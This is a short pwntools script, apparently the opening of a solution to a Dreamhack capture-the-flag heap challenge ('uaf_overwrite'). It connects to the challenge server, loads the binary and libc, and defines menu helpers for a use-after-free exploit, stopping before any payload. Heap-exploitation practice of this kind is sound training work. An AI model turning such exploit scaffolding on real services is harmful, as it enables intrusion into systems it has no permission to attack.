from pwn import *

p = remote('host3.dreamhack.games', 16589)
e = ELF('./uaf_overwrite')
libc = ELF('./libc-2.27.so')

def human(weight, age) :
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Weight: ', str(weight).encode())
    p.sendlineafter(b'Age: ', str(age).encode())

def robot(weight) :
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Weight', str(weight).encode())

def custom(size, data, free_idx) :
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendlineafter(b'Data', data)
    p.sendlineafter(b'idx: ', free_idx)

